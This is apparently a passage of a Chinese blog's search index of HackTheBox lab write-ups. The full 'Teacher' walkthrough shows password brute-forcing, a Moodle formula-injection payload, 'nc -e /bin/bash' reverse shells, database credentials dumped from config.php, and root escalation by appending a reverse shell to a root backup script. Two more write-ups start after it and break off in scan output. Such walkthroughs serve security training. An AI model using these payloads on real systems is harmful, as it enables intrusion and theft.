fingerprint:\nOS:SCAN(V=7.91%E=4%D=6/30%OT=80%CT=1%CU=36344%PV=Y%DS=2%DC=T%G=Y%TM=62BCFA9\nOS:9%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS\nOS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1\nOS:1NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN\nOS:(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT       ADDRESS\n1   170.79 ms 10.10.14.1\n2   171.01 ms 10.10.10.153\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 40.07 seconds\n```\n## Http\n![](Hackthebox-Teacher/1e4608da-14bc-4b0b-b3b0-c32748a6bdde.png)\n\n## Fuzz\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# ffuf -u 'http://10.10.10.153/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.153/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\nfonts                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 342ms]\nphpmyadmin              [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 339ms]\nmanual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 355ms]\nimages                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 5521ms]\ncss                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 5521ms]\njavascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 5542ms]\njs                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 6427ms]\nmoodle                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 340ms]\nserver-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 345ms]\n                        [Status: 200, Size: 8028, Words: 514, Lines: 250, Duration: 1349ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 161 req/sec :: Duration: [0:02:01] :: Errors: 96 ::\n```\n挨个访问后发现 phpmyadmin 无权限访问，manual 得到了一个信息，该靶机使用的中间件是 Apache HTTP Server Version 2.4。访问 moodle 目录会跳转到 http://teacher.htb/moodle，我们去加一个hosts\n\n```bash\necho 10.10.10.153 teacher.htb >> /etc/hosts\n```\n![](Hackthebox-Teacher/81e7be9a-ed9e-4424-a5ca-0344a074e741.png)\n\n这边拿到了一个账号，但是没有密码，去看看其他思路。\n\n![](Hackthebox-Teacher/f507b96c-bf54-4480-a2c4-5fdd3966cda5.png)\n\n这张图片一看就有点不对，我们去访问一下看看\n\n![](Hackthebox-Teacher/98fb4b3b-f5de-4e63-b734-ff729b5dd542.png)\n\n文件损坏？下载下来看看\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# wget http://teacher.htb/images/5.png                           \n--2022-06-30 10:42:06--  http://teacher.htb/images/5.png\n正在解析主机 teacher.htb (teacher.htb)... 10.10.10.153\n正在连接 teacher.htb (teacher.htb)|10.10.10.153|:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：200 [image/png]\n正在保存至: “5.png”\n\n5.png                                                      100%[========================================================================================================================================>]     200  --.-KB/s  用时 0s      \n\n2022-06-30 10:42:07 (14.1 MB/s) - 已保存 “5.png” [200/200])\n\n\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# ls                          \n5.png\n\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# file 5.png                                                                                                        \n5.png: ASCII text\n```\n这是一个 text 文本文件，读取一下内容\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# cat 5.png     \nHi Servicedesk,\n\nI forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.\n\nCould you guys figure out what the last charachter is, or just reset it?\n\nThanks,\nGiovanni\n```\n得到了一个账号密码，但密码的最后一位不确定\n\n```bash\nusername = Giovanni\npassword = Th4C00lTheacha?\n```\n我们去爆破一下最后一位密码\n\n# 漏洞利用\n首先使用现有的密码去生成一个密码字典\n\n```bash\nTh4C00lTheachaa\nTh4C00lTheachab\nTh4C00lTheachac\nTh4C00lTheachad\nTh4C00lTheachae\nTh4C00lTheachaf\nTh4C00lTheachag\nTh4C00lTheachah\nTh4C00lTheachai\nTh4C00lTheachaj\nTh4C00lTheachak\nTh4C00lTheachal\nTh4C00lTheacham\nTh4C00lTheachan\nTh4C00lTheachao\nTh4C00lTheachap\nTh4C00lTheachaq\nTh4C00lTheachar\nTh4C00lTheachas\nTh4C00lTheachat\nTh4C00lTheachau\nTh4C00lTheachav\nTh4C00lTheachaw\nTh4C00lTheachax\nTh4C00lTheachay\nTh4C00lTheachaz\nTh4C00lTheacha!\nTh4C00lTheacha@\nTh4C00lTheacha#\nTh4C00lTheacha$\nTh4C00lTheacha%\nTh4C00lTheacha^\nTh4C00lTheacha&\nTh4C00lTheacha*\nTh4C00lTheacha(\nTh4C00lTheacha)\nTh4C00lTheacha_\nTh4C00lTheacha-\nTh4C00lTheacha+\nTh4C00lTheacha=\nTh4C00lTheacha.\nTh4C00lTheacha?\nTh4C00lTheacha/\nTh4C00lTheacha\\\nTh4C00lTheacha0\nTh4C00lTheacha1\nTh4C00lTheacha2\nTh4C00lTheacha3\nTh4C00lTheacha4\nTh4C00lTheacha5\nTh4C00lTheacha6\nTh4C00lTheacha7\nTh4C00lTheacha8\nTh4C00lTheacha9\n```\n然后去爆破一下\n\n![](Hackthebox-Teacher/c6a0e0bf-e09c-4f14-a05b-6555547c1962.png)\n\n这边 Th4C00lTheacha# 的结果不一样，就是正确密码了，我们得到了一个账号密码\n\n```bash\nusername = Giovanni\npassword = Th4C00lTheacha#\n```\n![](Hackthebox-Teacher/b9c7f3b6-87ba-4c96-81ea-d7c3fb9a81c1.png)\n\n这边针对 moodle 找到了一篇漏洞的参考文章\n\n> [https://blog.sonarsource.com/moodle-remote-code-execution/?redirect=rips](https://blog.sonarsource.com/moodle-remote-code-execution/?redirect=rips)\n\n首先，我们将进入`Algebra`课程\n\n![](Hackthebox-Teacher/06f645ab-8990-4d77-aedc-37a9fd2716a8.png)\n\n然后打开编辑\n\n![](Hackthebox-Teacher/b736266e-6c53-4ba7-9c4f-481719cd7495.png)\n\n![](Hackthebox-Teacher/4f298a66-f373-439b-8b16-d26da7596aad.png)\n\n然后随便选一个点击 Add an activity or resource 进行添加\n\n然后选择 Quiz\n\n![](Hackthebox-Teacher/a6013e82-e3a4-4f24-836a-f3e4faad623e.png)\n\n这里随便填，然后save and display\n\n![](Hackthebox-Teacher/044ed8ef-9edf-4ea1-ab4a-2ef97dc82415.png)\n\n接着 edit quiz\n\n![](Hackthebox-Teacher/921d4364-6b64-4719-a978-ae2fda18f22b.png)\n\n然后 a new question 新增一个新问题\n\n![](Hackthebox-Teacher/04aecc7e-5266-401c-97aa-50c61acc3cee.png)\n\n然后选择calculated\n\n![](Hackthebox-Teacher/ed6e8725-f14d-4caa-b1e7-aecc2e9ab7cf.png)\n\n上面随便填写，answer 1 formalu 输入我们的payload，然后grade选择100%就行\n\n```bash\n/*{a*/`$_GET[0]`;//{x}}\n```\n然后 save change\n\n![](Hackthebox-Teacher/98955b9c-2215-4703-88ca-a12bff29952f.png)\n\n```bash\nhttp://teacher.htb/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7\n```\n点击 next page 进入页面，得到了上面的地址\n\n然后使用 nc 开启一个端口监听\n\n```bash\n&0=(nc -e /bin/bash 10.10.14.2 4444)\n```\n最后将我们的 shell 反弹语句添加到url的最后面\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nc -nvlp 4444                       \nlistening on [any] 4444 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.153] 56932\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")';\nwww-data@teacher:/var/www/html/moodle/question$\n```\n成功获取到一个 shell\n\n```bash\nwww-data@teacher:/var/www/html/moodle/question$ cd /home\ncd /home\nwww-data@teacher:/home$ ls\nls\ngiovanni\nwww-data@teacher:/home$ cd giovanni\ncd giovanni\nbash: cd: giovanni: Permission denied\n```\n我们没有权限访问用户目录\n\n# 权限提升\n## User\n这边用的是 moodle 的 cms，而在之前 fuzz 的时候有看到一个 phpmyadmin，所以我猜测是和数据库有关。\n\n既然和数据库有关，又是 cms，那么很可能配置文件中有数据的账号密码，去找一下\n\n```bash\nwww-data@teacher:/var/www/html/moodle$ ls                                                                                                                                                                                                   \nls                                                                                                                                                                                                                                          \nCONTRIBUTING.txt           config-dist.php.bak  message                                                                                                                                                                                     \nCOPYING.txt                config.php           mnet                                                                                                                                                                                        \nGruntfile.js               config.php.save      mod                                                                                                                                                                                         \nINSTALL.txt                course               my                                                                                                                                                                                          \nPULL_REQUEST_TEMPLATE.txt  dataformat           notes                                                                                                                                                                                       \nREADME.txt                 draftfile.php        npm-shrinkwrap.json                                                                                                                                                                         \nTRADEMARK.txt              enrol                package.json                                                                                                                                                                                \nadmin                      error                phpunit.xml.dist                                                                                                                                                                            \nanalytics                  file.php             pix                                                                                                                                                                                         \nauth                       files                plagiarism                                                                                                                                                                                  \navailability               filter               pluginfile.php                                                                                                                                                                              \nbackup                     githash.php          portfolio                                                                                                                                                                                   \nbadges                     grade                question                                                                                                                                                                                    \nbehat.yml.dist             group                rating                                                                                                                                                                                      \nblocks                     help.php             report                                                                                                                                                                                      \nblog                       help_ajax.php        repository                                                                                                                                                                                  \nbrokenfile.php             index.php            rss                                                                                                                                                                                         \ncache                      install              search                                                                                                                                                                                      \ncalendar                   install.php          tag                                                                                                                                                                                         \ncohort                     iplookup             theme                                                                                                                                                                                       \ncomment                    lang                 user                                                                                                                                                                                        \ncompetency                 lib                  userpix\ncompletion                 local                version.php\ncomposer.json              login                webservice\ncomposer.lock              media\nwww-data@teacher:/var/www/html/moodle$ cat config.php\ncat config.php\n<?php  // Moodle configuration file\n\nunset($CFG);\nglobal $CFG;\n$CFG = new stdClass();\n\n$CFG->dbtype    = 'mariadb';\n$CFG->dblibrary = 'native';\n$CFG->dbhost    = 'localhost';\n$CFG->dbname    = 'moodle';\n$CFG->dbuser    = 'root';\n$CFG->dbpass    = 'Welkom1!';\n$CFG->prefix    = 'mdl_';\n$CFG->dboptions = array (\n  'dbpersist' => 0,\n  'dbport' => 3306,\n  'dbsocket' => '',\n  'dbcollation' => 'utf8mb4_unicode_ci',\n);\n\n$CFG->wwwroot   = 'http://teacher.htb/moodle';\n$CFG->dataroot  = '/var/www/moodledata';\n$CFG->admin     = 'admin';\n\n$CFG->directorypermissions = 0777;\n\nrequire_once(__DIR__ . '/lib/setup.php');\n\n// There is no php closing tag in this file,\n// it is intentional because it prevents trailing whitespace problems!\n```\n在 /var/www/html/moodle/config.php 中，找到了数据库的账号密码\n\n```bash\n$CFG->dbuser    = 'root';\n$CFG->dbpass    = 'Welkom1!';\n```\n```bash\nmysql -h 127.0.0.1 -u root -p\nEnter password: Welkom1!\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 499\nServer version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1\n\nCopyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]>\n```\n成功登入 mysql\n\n```bash\nMariaDB [(none)]> show databases;\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| moodle             |\n| mysql              |\n| performance_schema |\n| phpmyadmin         |\n+--------------------+\n5 rows in set (0.00 sec)\n```\n```bash\nMariaDB [moodle]> show tables;\nshow tables;\n+----------------------------------+\n| Tables_in_moodle                 |\n+----------------------------------+\n| mdl_user                         |\n+----------------------------------+\n388 rows in set (0.00 sec)\n```\n表有很多，我就列一个对我们来说有用的了\n\n```bash\nMariaDB [moodle]> select * from mdl_user;\nselect * from mdl_user;\nn| id   | auth   | confirmed | policyagreed | deleted | suspended | mnethostid | username    | password                                                     | idnumber | firstname  | lastname | email          | emailstop | icq | skype | yahoo | aim | msn | phone1 | phone2 | institution | department | address | city | country | lang | calendartype | theme | timezone | firstaccess | lastaccess | lastlogin  | currentlogin | lastip        | secret | picture | url | description                                                               | descriptionformat | mailformat | maildigest | maildisplay | autosubscribe | trackforums | timecreated | timemodified | trustbitmask | imagealt | lastnamephonetic | firstnamephonetic | middlename | alternatename |\nn|    1 | manual |         1 |            0 |       0 |         0 |          1 | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |          | Guest user |          | root@localhost |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | This user is a special user that allows read-only access to some courses. |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |   1530058999 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          |\n|    2 | manual |         1 |            0 |       0 |         0 |          1 | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |          | Admin      | User     | gio@gio.nl     |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059097 | 1530059573 | 1530059097 |   1530059307 | 192.168.206.1 |        |       0 |     |                                                                           |                 1 |          1 |          0 |           1 |             1 |           0 |           0 |   1530059135 |            0 | NULL     |                  |                   |            |               |\n|    3 | manual |         1 |            0 |       0 |         0 |          1 | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |          | Giovanni   | Chhatta  | Giio@gio.nl    |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059681 | 1656564818 | 1656558129 |   1656558822 | 10.10.14.2    |        |       0 |     |                                                                           |                 1 |          1 |          0 |           2 |             1 |           0 |  1530059291 |   1530059291 |            0 |          |                  |                   |            |               |\n| 1337 | manual |         0 |            0 |       0 |         0 |          0 | Giovannibak | 7a860966115182402ed06375cf0a22af                             |          |            |          |                |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | NULL                                                                      |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |            0 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          |\nn4 rows in set (0.00 sec)\n```\n最后只有第四个用户的 hash 可以解密出来，看名字是个备份，那用户名应该就是 giovanni 了\n\n```bash\nusername = giovanni\npassword = expelled\n```\n这就是我们刚才没有权限访问的那个用户目录了，去切换到这个用户试试\n\n```bash\nwww-data@teacher:/home$ su giovanni\nsu giovanni\nPassword: expelled\n\ngiovanni@teacher:/home$ whoami&&id\nwhoami&&id\ngiovanni\nuid=1000(giovanni) gid=1000(giovanni) groups=1000(giovanni)\n```\n成功提权到 user 权限\n\n```bash\ngiovanni@teacher:/home$ cd giovanni\ncd giovanni\ngiovanni@teacher:~$ ls\nls\nuser.txt  work\ngiovanni@teacher:~$ cat user.txt\ncat user.txt\n9c991cf63230e31da617d2f1b8bb08d1\n```\n成功拿到 user 权限的 flag 文件\n\n## Root\n```bash\ngiovanni@teacher:/usr/bin$ cat backup.sh\ncat backup.sh\n#!/bin/bash\ncd /home/giovanni/work;\ntar -czvf tmp/backup_courses.tar.gz courses/*;\ncd tmp;\ntar -xf backup_courses.tar.gz;\nchmod 777 * -R;\n```\n在 /usr/bin 目录下发现一个名为 bakcup.sh 的脚本\n\n```bash\ngiovanni@teacher:/usr/bin$ ls -la backup.sh\nls -la backup.sh\n-rwxr-xr-x 1 root root 138 Jun 27  2018 backup.sh\n```\n权限是 root 用户的，咱们有执行权限，但是没有写入权限\n\n但是这里脚本中有个问题 chmod 777 \\* -R; 这一句是代表这给所有用户赋予了所有权限，这里就是提权的关键点了\n\n```bash\ngiovanni@teacher:~/work$ ln -s /root ./tmp\nln -s /root ./tmp\ngiovanni@teacher:~/work$ ls -la\nls -la\ntotal 16\ndrwxr-xr-x 4 giovanni giovanni 4096 Mar 21 15:29 .\ndrwxr-x--- 4 giovanni giovanni 4096 Apr 27 14:59 ..\ndrwxr-xr-x 3 giovanni giovanni 4096 Mar 21 15:29 courses\ndrwxr-xr-x 3 giovanni giovanni 4096 Jun 30 07:33 tmp\n```\n首先创建一个软连接，将这个脚本本身给赋予 777 权限\n\n```bash\ncd /home/giovanni/work/tmp/\nrm -rf courses\nln -s /usr/bin/ courses\n```\n然后我们就有权限对 backup.sh 这个脚本进行修改了\n\n接着使用 nc 再监听一个端口\n\n```bash\nnc -nvlp 5555\n```\n接着写入一个 nc 反弹语句\n\n```bash\necho \"nc -e /bin/bash 10.10.14.2 5555\" >> /usr/bin/backup.sh\n```\n然后等着 shell 反弹回来就好了\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nc -nvlp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.153] 51910\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功获得 root 权限\n\n```bash\ncat /root/root.txt\n05d8e3ee43c6af33f80069c615a88e4b\n```\n成功获得 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Trick  - Hackthebox","url":"/2022/06/18/Hackthebox/Easy/Hackthebox-Trick /","content":"\n# Hackthebox - Trick \n# 靶场信息\n![image](Hackthebox-Trick/a15baf12-ab15-46d4-b50e-36faa850cd4f.png)\n\n# 靶场类型\n![image](Hackthebox-Trick/6d4bd84c-f2d8-4d1f-9c1d-dfd449ddf64e.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.166\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-06-19 21:55 EDT\nNmap scan report for 10.10.11.166\nHost is up (0.22s latency).\nNot shown: 65531 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)\n|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)\n|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)\n25/tcp open  smtp    Postfix smtpd\n|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, \n53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)\n| dns-nsid: \n|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian\n80/tcp open  http    nginx 1.14.2\n|_http-server-header: nginx/1.14.2\n|_http-title: Coming Soon - Start Bootstrap Theme\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=6/19%OT=22%CT=1%CU=32194%PV=Y%DS=2%DC=T%G=Y%TM=62AFD3E\nOS:E%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ\nOS:(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%TS=B)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O\nOS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=\nOS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   221.19 ms 10.10.14.1\n2   221.28 ms 10.10.11.166\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 82.62 seconds\n```\n## Http\n![image](Hackthebox-Trick/fa08a205-35fb-483f-acfb-a3592fd1650c.png)\n\n有点不太理解这是什么网站，不过可以有个订阅功能，随便填一个邮箱试试看\n\n![image](Hackthebox-Trick/75f3705b-561b-4eff-9dfe-46912e4eed5f.png)\n\n给回了个网站，应该是直接提示了使用的框架","tags":["Hackthebox"]},{"title":"OpenSource - Hackthebox","url":"/2022/06/07/Hackthebox/Easy/Hackthebox-OpenSource/","content":"\n# Hackthebox - OpenSource\n# 靶场信息\n![](Hackthebox-OpenSource/7c8a2553-c178-411e-be99-f0be9eb6eafe.png)\n\n# 靶场类型\n![](Hackthebox-OpenSource/76d216ed-bd37-4d40-831e-75674e82213d.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀lucifiel)-[~]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.164\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-06-06 14:49 CST\nWarning: 10.10.11.164 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.11.164\nHost is up (0.18s latency).\nNot shown: 62504 closed ports, 3029 filtered ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)\n|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)\n|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)\n80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/2.1.2 Python/3.10.3\n|     Date: Mon, 06 Jun 2022 06:56:05 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 5316\n|     Connection: close\n|     <html lang=\"en\">\n|     <head>\n|     <meta charset=\"UTF-8\">\n|     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n|     <title>upcloud - Upload files for Free!</title>\n|     <script src=\"/static/vendor/jquery/jquery-3.4.1.min.js\"></script>\n|     <script src=\"/static/vendor/popper/popper.min.js\"></script>\n|     <script src=\"/static/vendor/bootstrap/js/bootstrap.min.js\"></script>\n|     <script src=\"/static/js/ie10-viewport-bug-workaround.js\"></script>\n|     <link rel=\"stylesheet\" href=\"/static/vendor/bootstrap/css/bootstrap.css\"/>\n|     <link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-grid.css\"/>\n|     <link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-reboot.css\"/>\n|     <link rel=\n|   HTTPOptions:\n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/2.1.2 Python/3.10.3\n|     Date: Mon, 06 Jun 2022 06:56:06 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Allow: OPTIONS, HEAD, GET\n|     Content-Length: 0\n|     Connection: close\n|   RTSPRequest:\n|     <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n|     \"http://www.w3.org/TR/html4/strict.dtd\">\n|     <html>\n|     <head>\n|     <meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\">\n|     <title>Error response</title>\n|     </head>\n|     <body>\n|     <h1>Error response</h1>\n|     <p>Error code: 400</p>\n|     <p>Message: Bad request version ('RTSP/1.0').</p>\n|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>\n|     </body>\n|_    </html>\n|_http-server-header: Werkzeug/2.1.2 Python/3.10.3\n|_http-title: upcloud - Upload files for Free!\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port80-TCP:V=7.91%I=7%D=6/6%Time=629DA3F6%P=x86_64-pc-linux-gnu%r(GetRe\nSF:quest,1573,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.1\\.2\\x20Py\nSF:thon/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2006\\x20Jun\\x202022\\x2006:56:05\\x20GMT\\\nSF:r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x205\nSF:316\\r\\nConnection:\\x20close\\r\\n\\r\\n<html\\x20lang=\\\"en\\\">\\n<head>\\n\\x20\\\nSF:x20\\x20\\x20<meta\\x20charset=\\\"UTF-8\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\nSF:\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\\.0\\\">\\n\nSF:\\x20\\x20\\x20\\x20<title>upcloud\\x20-\\x20Upload\\x20files\\x20for\\x20Free!<\nSF:/title>\\n\\n\\x20\\x20\\x20\\x20<script\\x20src=\\\"/static/vendor/jquery/jquer\nSF:y-3\\.4\\.1\\.min\\.js\\\"></script>\\n\\x20\\x20\\x20\\x20<script\\x20src=\\\"/stati\nSF:c/vendor/popper/popper\\.min\\.js\\\"></script>\\n\\n\\x20\\x20\\x20\\x20<script\\\nSF:x20src=\\\"/static/vendor/bootstrap/js/bootstrap\\.min\\.js\\\"></script>\\n\\x\nSF:20\\x20\\x20\\x20<script\\x20src=\\\"/static/js/ie10-viewport-bug-workaround\\\nSF:.js\\\"></script>\\n\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\nSF:\\\"/static/vendor/bootstrap/css/bootstrap\\.css\\\"/>\\n\\x20\\x20\\x20\\x20<lin\nSF:k\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"\\x20/static/vendor/bootstrap/css/boot\nSF:strap-grid\\.css\\\"/>\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20hre\nSF:f=\\\"\\x20/static/vendor/bootstrap/css/bootstrap-reboot\\.css\\\"/>\\n\\n\\x20\\\nSF:x20\\x20\\x20<link\\x20rel=\")%r(HTTPOptions,C7,\"HTTP/1\\.1\\x20200\\x20OK\\r\\n\nSF:Server:\\x20Werkzeug/2\\.1\\.2\\x20Python/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2006\\x\nSF:20Jun\\x202022\\x2006:56:06\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20char\nSF:set=utf-8\\r\\nAllow:\\x20OPTIONS,\\x20HEAD,\\x20GET\\r\\nContent-Length:\\x200\nSF:\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(RTSPRequest,1F4,\"<!DOCTYPE\\x20HTML\nSF:\\x20PUBLIC\\x20\\\"-//W3C//DTD\\x20HTML\\x204\\.01//EN\\\"\\n\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\\"http://www\\.w3\\.org/TR/html4/strict\\.dtd\\\